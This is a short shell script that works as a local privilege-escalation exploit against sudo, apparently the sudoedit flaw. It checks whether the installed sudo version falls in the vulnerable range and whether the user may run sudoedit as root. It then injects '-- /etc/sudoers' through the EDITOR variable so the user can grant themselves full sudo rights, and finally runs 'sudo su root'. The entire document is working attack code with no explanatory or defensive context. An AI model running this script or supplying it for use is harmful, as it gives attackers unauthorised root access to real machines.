if ! sudo --version | head -1 | grep -qE '(1\.8.*|1\.9\.[0-9]1?(p[1-3])?|1\.9\.12p1)$'
then
    echo "> Currently installed sudo version is not vulnerable"
    exit 1
fi

EXPLOITABLE=$(sudo -l | grep -E "sudoedit|sudo -e" | grep -E '\(root\)|\(ALL\)|\(ALL : ALL\)' | cut -d ')' -f 2-)

if [ -z "$EXPLOITABLE" ]; then
    echo "> It doesn't seem that this user can run sudoedit as root"
    read -p "Do you want to proceed anyway? (y/N): " confirm && [[ $confirm == [yY] ]] || exit 2
else
    echo "> BINGO! User exploitable"
    echo "> Opening sudoers file, please add the following line to the file in order to do the privesc:"
    echo "$( whoami ) ALL=(ALL:ALL) ALL"
    read -n 1 -s -r -p "Press any key to continue..."
    EDITOR="vim -- /etc/sudoers" $EXPLOITABLE
    sudo su root
    exit 0
fi
